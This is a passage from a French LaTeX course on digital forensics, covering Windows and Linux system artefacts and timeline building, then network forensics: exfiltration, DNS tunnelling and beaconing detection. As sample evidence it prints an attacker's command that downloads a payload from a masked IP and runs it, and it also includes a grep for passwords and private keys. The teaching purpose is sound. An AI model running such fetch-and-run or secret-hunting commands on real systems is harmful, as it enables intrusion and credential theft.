    Différent de Modified~! Un renommage modifie C sans modifier M \\
\textbf{E}. Entry created/Birth & Création de l'entrée MFT &
    Peut différer de la date de création réelle du fichier
    si copié depuis un autre volume \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~14.3. Les quatre horodatages MACE de NTFS}\end{center}

\begin{boxalert}
\textbf{``Timestomping''~: la manipulation des horodatages}

Des outils comme \texttt{timestomp} permettent à un attaquant de
modifier artificiellement les 4~horodatages MACE d'un fichier pour
le faire ``apparaître'' plus ancien et échapper à la timeline.

\textbf{Détection~:} le \texttt{\$UsnJrnl} (section suivante) et le
\texttt{\$LogFile} (journal de transactions NTFS) enregistrent les
\emph{changements} d'horodatages indépendamment des valeurs MACE
elles-mêmes. Une entrée \texttt{\$MFT} affichant une date de création
``2020'' alors que le \texttt{\$UsnJrnl} montre une création le
``13/03/2026'' révèle un timestomping. \textbf{Toujours croiser
\$MFT et \$UsnJrnl pour les fichiers suspects.}
\end{boxalert}

\subsection{Le journal USN~: l'historique immuable des changements}

Le \termecle{\$UsnJrnl}\index{\$UsnJrnl} (\textit{Update Sequence Number
Journal}) enregistre chronologiquement chaque opération sur le système
de fichiers~: création, suppression, renommage, modification.
Contrairement à la \texttt{\$MFT} qui ne montre que l'\emph{état actuel},
le \texttt{\$UsnJrnl} montre l'\emph{historique}.

\begin{boxoutils}{Extraction du \$UsnJrnl avec MFTECmd}
\begin{lstlisting}[language=bash_forensique]
# Extraction et parsing du journal USN
MFTECmd.exe -f /mnt/evidence/\$Extend/\$UsnJrnl:\$J --csv ./output/

# Resultat (extrait, chronologique) :
# Timestamp            Filename              Reason
# 2026-03-13 02:16:50  enc_all.ps1           FileCreate
# 2026-03-13 02:17:44  enc_all.ps1           DataExtend|Close
# 2026-03-13 02:18:30  enc_all.ps1           FileDelete
# 2026-03-13 02:18:31  encrypted_files_list.txt  FileCreate
# 2026-03-13 02:18:31  *.docx (x847)         DataOverwrite (chiffrement)
\end{lstlisting}
\textbf{Constatation~:} le \texttt{\$UsnJrnl} révèle la séquence
exacte~: création du script (02h16:50)~$\to$ exécution (02h17:44, cohérent
avec Prefetch/UserAssist)~$\to$ suppression du script (02h18:30, tentative
d'anti-forensique)~$\to$ chiffrement de masse (02h18:31, 847~fichiers).
\textbf{La suppression du script à 02h18:30 n'a effacé ni le Prefetch,
ni UserAssist, ni le \$UsnJrnl lui-même.}
\end{boxoutils}

% ============================================================================
\section{Artefacts Linux~: journald, bash et ext4}
\label{sec:artefacts-linux}
% ============================================================================

\subsection{Le journal systemd}

Sur les systèmes Linux modernes (Ubuntu~20.04+, Debian~11+, RHEL~8+),
\termecle{journald}\index{journald} centralise les logs système dans
un format binaire indexé.

\begin{boxoutils}{Analyse forensique de journald}
\begin{lstlisting}[language=bash_forensique]
# Analyser les journaux d'une image montee (hors-ligne)
journalctl --root=/mnt/evidence --since "2026-03-13 02:00:00" \
    --until "2026-03-13 03:00:00"

# Filtrer par service (ex : SSH)
journalctl --root=/mnt/evidence -u ssh.service

# Connexions SSH reussies / echouees
journalctl --root=/mnt/evidence | grep -i "sshd.*Accepted\|sshd.*Failed"
# Resultat type :
# Mar 13 02:14:02 srv sshd[4821]: Failed password for root from
#     185.220.XX.XX port 51234 ssh2
# Mar 13 02:14:09 srv sshd[4821]: Accepted password for root from
#     185.220.XX.XX port 51234 ssh2
# -> 7 tentatives echouees puis succes : brute-force reussi

# Commandes sudo executees
journalctl --root=/mnt/evidence | grep "sudo:.*COMMAND"
\end{lstlisting}
\end{boxoutils}

\subsection{Historique bash et fichiers de configuration shell}

\begin{boxoutils}{Artefacts shell -- bash\_history et environnement}
\begin{lstlisting}[language=bash_forensique]
# Historique des commandes (attention : tronque a HISTSIZE)
cat /mnt/evidence/root/.bash_history
cat /mnt/evidence/home/*/.bash_history

# Timestamps si HISTTIMEFORMAT etait active :
# #1678672664
# wget http://185.220.XX.XX/payload.sh
# #1678672680
# chmod +x payload.sh && ./payload.sh

# Fichiers de configuration modifies recemment (persistance)
find /mnt/evidence/etc -name "*.service" -newer \
    /mnt/evidence/etc/hostname

# Crontabs -- mecanisme de persistance frequent
cat /mnt/evidence/etc/crontab
cat /mnt/evidence/var/spool/cron/crontabs/*
ls -la /mnt/evidence/etc/cron.d/

# Cles SSH autorisees (backdoor frequente)
cat /mnt/evidence/root/.ssh/authorized_keys
cat /mnt/evidence/home/*/.ssh/authorized_keys
\end{lstlisting}
\end{boxoutils}

\begin{boiteRemarque}{bash\_history~: une preuve fragile}
Le fichier \texttt{.bash\_history} n'est écrit sur disque qu'à la
fermeture propre du shell (\texttt{exit}, ou périodiquement). Un
attaquant qui tue brutalement sa session (\texttt{kill~-9}) ou
définit \texttt{HISTSIZE=0} laisse un historique vide ou incomplet.
\textbf{Ne jamais conclure ``aucune commande exécutée'' sur la seule
absence d'historique~: croiser avec \texttt{journald},
\texttt{auditd} (si actif), et l'analyse mémoire (Volatility~3,
\texttt{linux.bash} récupère l'historique depuis la mémoire
même non écrit sur disque).}
\end{boiteRemarque}

\subsection{Structures ext4~: inodes et récupération}

Le système de fichiers \termecle{ext4}\index{ext4} organise chaque
fichier autour d'un \textit{inode} contenant ses métadonnées
(taille, permissions, horodatages, pointeurs vers les blocs de données).
La suppression d'un fichier sous ext4 libère l'inode et marque les blocs
comme disponibles, \textbf{sans effacer immédiatement le contenu}.

\begin{boxoutils}{Récupération de fichiers supprimés ext4 avec extundelete}
\begin{lstlisting}[language=bash_forensique]
# Lister les inodes recemment supprimes
extundelete /mnt/evidence/dev/sdb1 --inode 2

# Recuperer tous les fichiers supprimes recuperables
extundelete /mnt/evidence/dev/sdb1 --restore-all \
    -o /output/recovered/

# Alternative : debugfs pour inspection manuelle d'un inode
debugfs -R "stat <12345>" /mnt/evidence/dev/sdb1
# Affiche : Inode, Mode, taille, Links, horodatages, blocs

# Recherche de chaines dans l'espace libre (complement carving Ch. 9)
dd if=/mnt/evidence/dev/sdb1 bs=4096 skip=0 | \
    strings -n 8 | grep -i "password\|api_key\|BEGIN PRIVATE KEY"
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{Reconstruction de Timeline Forensique}
\label{sec:timeline}
% ============================================================================

\subsection{Pourquoi une timeline unifiée}

Chaque source d'artefacts (registre, \texttt{\$MFT}, \texttt{\$UsnJrnl},
journald, logs applicatifs) produit ses propres horodatages dans des
formats différents. La \termecle{timeline forensique}\index{timeline
forensique} unifie ces sources en une chronologie unique, permettant
de \textbf{voir la séquence complète des événements} et d'identifier
les corrélations qu'aucune source isolée ne révèle.

\subsection{log2timeline / plaso}

\begin{boxoutils}{Construction d'une timeline avec log2timeline (plaso)}
\begin{lstlisting}[language=bash_forensique]
# Generer le fichier plaso (extraction brute, multi-sources)
log2timeline.py /output/timeline.plaso /mnt/evidence/

# Filtrer et exporter en CSV pour la periode d'interet
psort.py -o l2tcsv -w /output/timeline.csv /output/timeline.plaso \
    "date > '2026-03-13 02:00:00' AND date < '2026-03-13 03:00:00'"

# Exemple de timeline consolidee (extrait, toutes sources) :
# 02:14:02  journald     SSH Failed password from 185.220.XX.XX
# 02:14:09  journald     SSH Accepted password (root)
# 02:16:50  $UsnJrnl     FileCreate enc_all.ps1
# 02:17:40  UserAssist   powershell.exe executed
# 02:17:42  UserAssist   cmd.exe executed
# 02:17:44  Prefetch     enc_all.ps1 executed (RunCount=1)
# 02:17:44  $UsnJrnl     enc_all.ps1 DataExtend|Close
# 02:18:30  $UsnJrnl     enc_all.ps1 FileDelete
# 02:18:31  $UsnJrnl     encrypted_files_list.txt FileCreate
# 02:18:31  $UsnJrnl     *.docx (x847) DataOverwrite
\end{lstlisting}
\end{boxoutils}

\subsection{Lecture d'une timeline~: constatation vs interprétation}

\begin{boxscenario}{Timeline MVOM -- rédaction du rapport}
À partir de la timeline consolidée ci-dessus, voici comment rédiger
les sections \textbf{Constatations} et \textbf{Analyse} (NIST~SP~800-86,
Ch.~7~(UE~SEC4031))~:

\textbf{Constatations (faits vérifiables, non ambigus)~:}
\begin{quote}
``Le journal \texttt{journald} enregistre 7~tentatives de connexion
SSH échouées depuis l'IP \texttt{185.220.XX.XX} entre 02h13:45 et
02h14:08, suivies d'une connexion réussie au compte \texttt{root}
à 02h14:09. Le \texttt{\$UsnJrnl} enregistre la création du fichier
\texttt{enc\_all.ps1} à 02h16:50. UserAssist et Prefetch enregistrent
l'exécution de \texttt{powershell.exe}, \texttt{cmd.exe} et
\texttt{enc\_all.ps1} entre 02h17:40 et 02h17:44. Le \texttt{\$UsnJrnl}
enregistre la suppression de \texttt{enc\_all.ps1} à 02h18:30, suivie
à 02h18:31 de la création de \texttt{encrypted\_files\_list.txt} et
de la modification de 847~fichiers \texttt{.docx}.''
\end{quote}

\textbf{Analyse (interprétation, avec niveau de confiance)~:}
\begin{quote}
``La séquence temporelle ci-dessus est cohérente, \emph{avec un niveau
de confiance élevé}, avec le scénario suivant~: un accès SSH non
autorisé au compte \texttt{root} a été obtenu par force brute
(02h14)~; environ 2~minutes et 40~secondes plus tard, un script
ransomware a été déposé et exécuté (02h16--02h18)~; ce script a
chiffré 847~fichiers avant de tenter de s'auto-supprimer
(02h18:30), une technique d'anti-forensique courante qui a
échoué à effacer les traces dans le \texttt{\$UsnJrnl}, le
Prefetch et UserAssist.''
\end{quote}
\end{boxscenario}

% ============================================================================
\section{Synthèse~: Méthodologie d'Analyse Système}
\label{sec:synthese-for-sys}
% ============================================================================

\begin{tableaucours}{p{3.5cm}p{3.5cm}p{4.5cm}}{%
    \tableauHeader{Question} &
    \tableauHeader{Sources Windows} &
    \tableauHeader{Sources Linux}
}
Quel programme a été exécuté, quand~? &
    Prefetch, UserAssist, ShimCache, Amcache &
    \texttt{bash\_history}, \texttt{auditd},
    \texttt{journald} (systemd-coredump) \\
Quel fichier a été créé/modifié/supprimé, quand~? &
    \texttt{\$UsnJrnl}, \texttt{\$MFT} (MACE) &
    \texttt{debugfs}, \texttt{extundelete},
    horodatages inode \\
Un périphérique externe a-t-il été connecté~? &
    \texttt{USBSTOR} (registre SYSTEM), Event~ID~2003/2100 &
    \texttt{journald} (kernel~: \texttt{usb~new device}),
    \texttt{/var/log/syslog} \\
Une connexion réseau a-t-elle été établie~? &
    Volatility \texttt{netscan} (Ch.~9~(UE~SEC4031)), pare-feu &
    \texttt{journald} (sshd, NetworkManager), \texttt{auditd} \\
Les horodatages ont-ils été manipulés~? &
    Croiser \texttt{\$MFT} (MACE) et \texttt{\$UsnJrnl} &
    Croiser \texttt{stat} inode et \texttt{journald} \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~14.4. Méthodologie d'analyse système~:
question $\to$ sources}\end{center}

\separateur

% --- Encadré lab NDAP SUKULU ---
\begin{boiteRemarque}{Notions mobilisées par le laboratoire INA-LAB-01}
Le laboratoire reconstitue une intrusion sur deux systèmes à partir
d'exports figés. Il suppose les notions suivantes.
\begin{itemize}
    \item \textbf{Journal d'authentification Linux} (journald ou
          \texttt{auth.log})~: chaque échec SSH laisse une ligne
          \texttt{Failed password for <compte>}, la réussite une ligne
          \texttt{Accepted password}~; le nombre d'échecs qui précèdent la
          réussite caractérise une attaque par force brute.
    \item \textbf{Persistance par création de compte}~: un attaquant crée
          souvent un compte (\texttt{useradd}, \texttt{adduser}) pour revenir~;
          la création apparaît dans le journal et, souvent, dans
          l'historique du shell.
    \item \textbf{\texttt{.bash\_history}}~: il donne les commandes et leur
          ordre, mais \emph{pas leur heure} (sauf si \texttt{HISTTIMEFORMAT}
          était défini)~; l'heure se cherche dans un autre artefact.
    \item \textbf{UserAssist et Prefetch}~: ils prouvent l'exécution d'un
          programme~; UserAssist donne un compteur et la date de dernière
          exécution (\texttt{last\_run})~: trier sur ce champ ordonne les
          programmes lancés.
    \item \textbf{\$UsnJrnl}~: il garde, pour chaque fichier, les raisons
          de modification (\texttt{FileCreate}, \texttt{DataExtend},
          \texttt{FileDelete})~; la création d'un fichier supprimé y reste
          visible avec son heure.
    \item \textbf{Comptage dans une fenêtre}~: pour mesurer l'impact, on
          compte les fichiers modifiés \emph{après} l'événement qui ouvre
          l'attaque, en écartant l'activité normale qui précède.
\end{itemize}
\end{boiteRemarque}

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Redondance forensique}~: une action système laisse
          de multiples traces indépendantes. Toujours chercher la
          convergence entre plusieurs sources avant de conclure.

    \item \textbf{Windows~: cinq artefacts à toujours vérifier}~:
          Prefetch (preuve d'exécution), UserAssist (historique GUI),
          ShimCache/Amcache (inventaire d'exécution avec hash),
          \texttt{\$UsnJrnl} (historique des changements de fichiers).

    \item \textbf{MACE et timestomping}~: les 4~horodatages NTFS
          (Modified, Accessed, Changed, Entry-created) peuvent être
          manipulés. Le \texttt{\$UsnJrnl} et le \texttt{\$LogFile}
          révèlent les manipulations car ils enregistrent
          l'\emph{historique}, pas seulement l'\emph{état}.

    \item \textbf{Linux~: \texttt{journald} + \texttt{bash\_history}
          + crontabs + \texttt{authorized\_keys}}~: les quatre premiers
          endroits à vérifier. \texttt{bash\_history} est fragile~:
          croiser avec Volatility \texttt{linux.bash} pour l'historique
          non écrit sur disque.

    \item \textbf{ext4}~: la suppression libère l'inode sans effacer
          immédiatement les données~; \texttt{extundelete} et
          \texttt{debugfs} permettent la récupération.

    \item \textbf{Timeline unifiée (log2timeline/plaso)}~: consolide
          toutes les sources en une chronologie. La rédaction du
          rapport sépare strictement \textbf{constatations}
          (faits horodatés, vérifiables) et \textbf{analyse}
          (interprétation, avec niveau de confiance explicite
          NIST~SP~800-86).
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~14.1. Identification d'artefacts \niveaubase}]
Pour chacune des questions suivantes, identifiez l'artefact Windows
ou Linux le plus pertinent, et la commande/outil pour l'extraire~:
\begin{enumerate}[(a)]
    \item Un suspect affirme n'avoir jamais exécuté \texttt{TrueCrypt}
          sur son PC Windows~10. Comment vérifier~?
    \item Une clé USB a-t-elle été branchée sur ce PC Windows dans les
          30~derniers jours, et si oui, laquelle (numéro de série)~?
    \item Sur un serveur Linux, un fichier \texttt{/etc/shadow} a été
          modifié il y a 2~jours. Comment savoir qui l'a modifié et quand,
          précisément~?
    \item Un fichier \texttt{rapport\_confidentiel.docx} a été supprimé
          d'un disque ext4 il y a 1~heure. Quelles sont les chances de
          récupération et quel outil utiliser~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~14.2. Détection de timestomping \niveaumoyen}]
L'analyse \texttt{\$MFT} d'un fichier \texttt{rootkit.dll} montre~:
\begin{lstlisting}[language=bash_forensique]
Created (E):   2019-08-12 14:30:00
Modified (M):  2019-08-12 14:30:00
Accessed (A):  2019-08-12 14:30:00
Changed (C):   2019-08-12 14:30:00
\end{lstlisting}
L'analyse \texttt{\$UsnJrnl} pour le même fichier montre~:
\begin{lstlisting}[language=bash_forensique]
2026-03-13 02:19:15  rootkit.dll  FileCreate
2026-03-13 02:19:16  rootkit.dll  DataExtend|Close
\end{lstlisting}
\begin{enumerate}[(a)]
    \item Que révèle cette divergence~?
    \item Rédigez la constatation (sans interprétation) et l'analyse
          (avec interprétation et niveau de confiance) correspondantes,
          en respectant la distinction NIST~SP~800-86.
    \item Quels autres artefacts (Prefetch, UserAssist, ShimCache)
          permettraient de confirmer l'horodatage réel d'exécution~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~14.3. Timeline complète \niveauexpert}]
Vous disposez d'une image E01 d'un serveur Windows~Server~2022
(Opération MVOM) et d'un dump RAM associé. Le service IT signale
que le ransomware a chiffré les fichiers entre 02h15 et 02h20
le 13~mars~2026, mais ne sait pas comment l'attaquant a obtenu
l'accès initial.

\begin{enumerate}[(a)]
    \item Construisez le plan d'investigation~: dans quel ordre
          analyser quelles sources (registre, \texttt{\$MFT},
          \texttt{\$UsnJrnl}, journal des événements, RAM)~? Justifiez
          l'ordre.
    \item Pour chaque source analysée, quelle question spécifique
          cherchez-vous à répondre~?
    \item Construisez (sur la base des éléments fournis dans ce
          chapitre et au Chapitre~9~(UE~SEC4031)) la timeline complète
          de l'incident, de l'accès initial au chiffrement.
    \item Rédigez les sections Constatations et Analyse de votre
          rapport~: au moins 5~constatations horodatées et une
          analyse globale avec niveau de confiance explicite.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Le Chapitre~\ref{chap:for-res} (Forensique Réseau
Opérationnelle) complète ce chapitre en se concentrant sur les artefacts
\emph{réseau}~: capture et analyse approfondie de trafic, détection
d'exfiltration de données, analyse de protocoles chiffrés. Le
Chapitre~\ref{chap:anti-for} (Anti-Forensique et Contre-Mesures)
traite ensuite des techniques que les attaquants utilisent pour
échapper exactement aux analyses présentées dans ce chapitre et
comment les détecter malgré tout.
\end{boxinfo}

      
        % ============================================================================
% Fichier  : partie4/P04_C15_forensique_reseau.tex
% Titre    : Forensique Réseau Opérationnelle
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% ============================================================================

\chapter{Forensique Réseau Opérationnelle}
\label{chap:for-res}

\epigraph{%
    « Le réseau ne ment jamais. Il ne se souvient pas de tout,
    mais ce dont il se souvient est vrai. »%
}{Principe de la forensique réseau}

\niveauChapitre{Expert}{%
    Maîtrise du Chapitre~9~(UE~SEC4031) (Wireshark bases)
    et du Chapitre~\ref{chap:for-sys} (timeline, redondance)
    indispensable. Protocoles TCP/IP, DNS, HTTP/S requis.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Positionner une sonde de capture dans différentes topologies
          réseau et comprendre ce que chaque position capture (et rate).
    \item Analyser en profondeur une capture \texttt{.pcap}~:
          flux TCP, indicateurs d'exfiltration, tunnels DNS,
          beaconing de malware.
    \item Reconstruire des sessions applicatives depuis une capture~:
          emails SMTP, transferts HTTP, commandes FTP.
    \item Analyser des logs de pare-feu, proxy et DNS pour reconstituer
          l'activité réseau en l'absence de capture complète.
    \item Identifier les marqueurs de communications C2
          (\textit{Command and Control}) dans le trafic chiffré.
    \item Appliquer la corrélation temporelle multi-sources~:
          capture réseau + logs système + timeline (Ch.~\ref{chap:for-sys}).
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Positionnement dans le cours}
% ============================================================================

Le Chapitre~9~(UE~SEC4031) a introduit Wireshark avec ses filtres
de base et le cas NKAM. Ce chapitre va plus loin~: comment capturer
intelligemment dans un réseau réel, comment analyser le trafic chiffré,
comment détecter l'exfiltration de données, et comment reconstituer
l'activité réseau quand on n'a pas de capture (mais des logs).

\separateur

% ============================================================================
\section{Positionnement de la Sonde~: ce qu'on Voit et ce qu'on Rate}
\label{sec:positionnement-sonde}
% ============================================================================

\subsection{Topologies et points de capture}

La valeur d'une capture réseau dépend \emph{entièrement} de la position
de la sonde dans le réseau. Capturer au mauvais endroit, c'est ne rien voir.

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Position} &
    \tableauHeader{Ce qu'on capture} &
    \tableauHeader{Ce qu'on rate}
}
\textbf{Port SPAN / Mirror} sur le switch principal &
    Tout le trafic qui traverse le switch (nord-sud ET est-ouest) &
    Trafic interne entre machines sur le même segment si non mirrored \\
\textbf{TAP réseau} sur le lien WAN &
    Tout le trafic entrant/sortant de l'entreprise vers Internet &
    Trafic interne (LAN to LAN)~; communications intra-entreprise \\
\textbf{Agent hôte} (sur la machine suspecte) &
    Tout le trafic de \emph{cette} machine, même chiffré avant
    le réseau &
    Trafic des autres machines \\
\textbf{Pare-feu / proxy logs} (sans capture) &
    Connexions autorisées/refusées (IP, port, octets) &
    Contenu des connexions~; trafic qui ne passe pas par le
    proxy (UDP, ICMP) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~15.1. Positions de capture et couverture}\end{center}

\subsection{Capture sur un switch managé~: SPAN port}

\begin{boxoutils}{Configuration d'un SPAN port (Cisco IOS)}
\begin{lstlisting}[language=bash_forensique]
! Configuration d'une session SPAN sur Cisco IOS
! Port monitore : GigabitEthernet0/1 (machine suspecte)
! Port destination : GigabitEthernet0/24 (poste forensique)

Switch(config)# monitor session 1 source interface Gi0/1 both
Switch(config)# monitor session 1 destination interface Gi0/24

! Verifier la configuration
Switch# show monitor session 1
! Resultat :
! Session 1
! Type           : Local Session
! Source Ports   : Both : Gi0/1
! Destination Ports : Gi0/24

! Sur le poste forensique (connecte sur Gi0/24) :
tcpdump -i eth0 -w /output/capture_suspect.pcap
! Ou avec ring buffer (fichiers de 100 Mo max) :
tcpdump -i eth0 -C 100 -W 50 -w /output/capture_%Y%m%d_%H%M%S.pcap
\end{lstlisting}
\end{boxoutils}

\begin{boiteRemarque}{Wireshark live vs tcpdump + analyse offline}
En contexte forensique, la bonne pratique est de capturer avec
\texttt{tcpdump} (léger, consomme peu de ressources) en production,
puis d'analyser avec Wireshark offline sur le \texttt{.pcap} résultant.
Lancer Wireshark avec son interface graphique directement sur une
machine en production peut introduire une charge réseau supplémentaire
et des artefacts dans la capture elle-même.
\end{boiteRemarque}

% ============================================================================
\section{Analyse Approfondie des Flux TCP}
\label{sec:analyse-flux}
% ============================================================================

\subsection{Suivre un flux complet~: Follow TCP Stream}

La fonction \textit{Follow TCP Stream} de Wireshark reconstitue la
session complète d'un échange TCP en réassemblant les segments dans
l'ordre. C'est l'outil le plus puissant pour comprendre rapidement
ce qu'une connexion a échangé.

\begin{boxoutils}{Wireshark -- Follow TCP Stream et export}
\begin{lstlisting}[language=bash_forensique]
# En ligne de commande avec tshark (equivalent Wireshark CLI)
# Extraire tous les flux TCP et les afficher
tshark -r capture.pcap -q -z "follow,tcp,ascii,0"

# Lister les conversations TCP avec volumes
tshark -r capture.pcap -q -z "conv,tcp"
# Resultat :
#                    |      <-      |      ->      |    Total
# 10.0.0.15:49212 <-> 185.220.XX.XX:4444
#                         1476       14832          16308 bytes

# Extraire les objets HTTP (fichiers telecharges)
tshark -r capture.pcap --export-objects "http,/output/http_objects/"

# Extraire les objets SMB (fichiers partages reseau)
tshark -r capture.pcap --export-objects "smb,/output/smb_objects/"
# Utile pour detecter exfiltration via partages reseau

# Calculer le hash SHA-256 de chaque objet extrait
find /output/http_objects/ -type f -exec sha256sum {} \; \
    > /output/http_objects_hashes.txt
# Puis soumettre sur VirusTotal (API ou interface web)
\end{lstlisting}
\end{boxoutils}

\subsection{Métriques d'anomalie réseau}

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Métrique} &
    \tableauHeader{Valeur normale} &
    \tableauHeader{Anomalie (indicateur suspect)}
}
Durée d'une session HTTP & 0.1--2~secondes & $>$~60~secondes~:
    session persistante anormale \\
Volume de réponse HTTP & Variable & Requête~\texttt{GET /index.html}
    de 200~octets reçoit 50~Mo~: exfiltration \\
Ratio upload/download & $\ll$~1 (navigation) & Ratio proche de~1~:
    exfiltration~; ratio $\gg$~1~: upload de données \\
Intervalles de connexion & Irréguliers & Intervalles fixes (30~s,
    60~s, 300~s)~: beaconing de malware \\
Entropie du contenu & Faible (texte/HTML) & Haute (binaire, chiffré)~:
    contenu encodé ou chiffré \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~15.2. Métriques d'anomalie réseau}\end{center}

% ============================================================================
\section{Détection d'Exfiltration de Données}
\label{sec:exfiltration}
% ============================================================================

\subsection{Exfiltration HTTP/HTTPS~: le vecteur le plus courant}

\begin{boxoutils}{Détecter une exfiltration HTTP depuis une capture}
\begin{lstlisting}[language=bash_forensique]
# Requetes POST avec corps volumineux (upload de donnees)
tshark -r capture.pcap -Y "http.request.method == POST" \
    -T fields -e frame.time -e ip.src -e ip.dst \
    -e http.host -e http.content_length

# Resultat suspect :
# 2026-03-13 02:19:05  10.0.0.15  185.220.XX.XX
#   update.windowscdn.net  content_length: 45231400
# -> 45 Mo envoyes vers un domaine qui semble legitime
#    mais est enregistre il y a 2 jours (CDN de facade)

# Calculer le volume par destination (top exfiltration targets)
tshark -r capture.pcap -q -z "ip_hosts,tree"
# Alternatif : Statistics --> IP Addresses dans Wireshark GUI

# Detecter contenu base64 dans les parametres URL
tshark -r capture.pcap -Y "http" \
    -T fields -e http.request.uri | \
    grep -oE "[A-Za-z0-9+/]{30,}={0,2}"
# Base64 de 30+ caracteres dans les URLs = encodage de donnees voles
\end{lstlisting}
\end{boxoutils}

\subsection{Tunneling DNS~: exfiltration via le port~53}

Le \termecle{tunneling DNS}\index{tunneling DNS} exploite le protocole
DNS pour exfiltrer des données ou établir un canal C2 (Command \& Control).
Son avantage~: le port~53 UDP est ouvert sur presque tous les pare-feu.

\begin{boxoutils}{Détecter le tunneling DNS}
\begin{lstlisting}[language=bash_forensique]
# Statistiques des requetes DNS par domaine (top queried)
tshark -r capture.pcap -Y "dns.qry.type == A" \
    -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -20

# Indicateurs de tunneling DNS :
# 1. Sous-domaines tres longs (encodage base32/64 dans le label)
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | \
    awk 'length($0) > 50'
# Resultat suspect :
# aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.malware.domain.com
# -> sous-domaine de 60 caracteres = payload encode

# 2. Volume de requetes DNS anormalement eleve pour un meme domaine
tshark -r capture.pcap -Y "dns.qry.name contains malware.domain.com" \
    -T fields -e frame.time -e dns.qry.name | wc -l
# 847 requetes en 10 minutes vers le meme domaine = tunnel

# 3. Reponses DNS TXT avec contenu inhabituel (canal C2 entrant)
tshark -r capture.pcap -Y "dns.resp.type == 16" \
    -T fields -e dns.txt
# Si les TXT ressemblent a du binaire encode : C2 via DNS TXT

# Outil specialise : dnscat2-detector ou dnstap-analysis
# Pour la forensique offline : analyser les logs du resolver DNS
\end{lstlisting}
\end{boxoutils}

\begin{boxCRO}
\textbf{Analyse CRO. Tunneling DNS et détection}

$\mathcal{C}$ (Confidentialité pour l'attaquant)~: le tunnel DNS chiffre
généralement son contenu~; même si le tunnel est détecté, le contenu
exfiltré peut être inaccessible sans la clé de déchiffrement.

$\mathcal{R}$ (Fiabilité de la détection)~: les indicateurs
statistiques (longueur de requête, volume, TXT records) sont des
\emph{indicateurs} de tunneling, pas des preuves directes. Un domaine
CDN légitime peut générer des sous-domaines longs. Documenter la
convergence de plusieurs indicateurs.

$\mathcal{O}$ (Opposabilité)~: la capture pcap avec les requêtes DNS
anormales constitue une preuve directe de l'activité réseau, admissible
selon les mêmes principes que tout autre artefact réseau.

\cro{$\downarrow$ contenu inaccessible}{$\uparrow$ convergence indicateurs}{$\uparrow\uparrow$ capture pcap directe}
\end{boxCRO}

\subsection{Beaconing~: détecter un implant actif}

Le \termecle{beaconing}\index{beaconing} est le comportement caractéristique
d'un malware qui contacte périodiquement son serveur C2 pour recevoir
des instructions. La signature~: des connexions à intervalles
réguliers vers la même destination.

\begin{lstlisting}[language=bash_forensique,
    caption={Détection de beaconing dans une capture}]
# Extraire les timestamps de connexions vers une IP suspecte
tshark -r capture.pcap \
    -Y "ip.dst == 185.220.XX.XX && tcp.flags.syn == 1" \
    -T fields -e frame.time_epoch | sort -n > /tmp/beacon_times.txt

# Calculer les intervalles entre connexions (en secondes)
awk 'NR>1{printf "%.0f\n", $1-prev} {prev=$1}' \
    /tmp/beacon_times.txt | sort | uniq -c | sort -rn

# Resultat type (beaconing sur 300 secondes) :
#   47 300    <- 47 intervalles de exactement 300 secondes
#    2 299
#    1 301
# -> malware avec beacon toutes les 5 minutes, jitter +/- 1s
# Comparaison : trafic normal -> distribution aleatoire des intervalles
\end{lstlisting}

% ============================================================================
\section{Reconstruction de Sessions Applicatives}
\label{sec:reconstruction-sessions}
% ============================================================================

\subsection{Reconstituer un email SMTP}

\begin{boxoutils}{Extraction et reconstruction d'email SMTP}
\begin{lstlisting}[language=bash_forensique]
# Extraire le contenu SMTP brut
tshark -r capture.pcap -Y "smtp" \
    -T fields -e smtp.req.command -e smtp.req.parameter

# Follow TCP Stream sur une session SMTP (non chiffree)
tshark -r capture.pcap -q -z "follow,tcp,ascii,5"
# Resultat type :
# EHLO attacker.ru
# MAIL FROM:<contact@medequip-portugal.com>
# RCPT TO:<finance@sotradi.cm>
# DATA
# From: Service Comptabilite <contact@medequip-portugal.com>
# Subject: Facture mensuelle equipements
# [corps du message avec piece jointe frauduleuse]

# Extraire les pieces jointes SMTP (format MIME)
# Wireshark GUI : File --> Export Objects --> IMF (Internet Mail)
# CLI :
tshark -r capture.pcap --export-objects "imf,/output/smtp_objects/"
# Puis analyser la piece jointe :
file /output/smtp_objects/attachment.pdf
sha256sum /output/smtp_objects/attachment.pdf
# Verifier sur VirusTotal
\end{lstlisting}
\end{boxoutils}

\begin{boxscenario}{Cas NKAM. Reconstruction complète de l'email BEC}
La capture réseau de SOTRADI~SA (\texttt{sotradi\_capture.pcap})
contient la session SMTP du phishing. Analyse~:

\textbf{Étape~1. Identifier la session SMTP suspecte~:}
\begin{lstlisting}[language=bash_forensique]
# Filtrer les sessions SMTP entrantes (serveur mail SOTRADI sur TCP 25)
tshark -r sotradi_capture.pcap -Y "smtp && tcp.dstport == 25"
# Session identifiee : frame 14872-14950, IP source 91.XXX.XX.XX
\end{lstlisting}

\textbf{Étape~2. Analyser les en-têtes SMTP~:}
\begin{lstlisting}[language=bash_forensique]
tshark -r sotradi_capture.pcap -q -z "follow,tcp,ascii,14872"
# En-tetes reveles :
# MAIL FROM: contact@medequip-portugal.com
# X-Originating-IP: 91.XXX.XX.XX    <- IP reelle (serveur russe)
# Received: from mail.yandex.ru      <- origine reelle
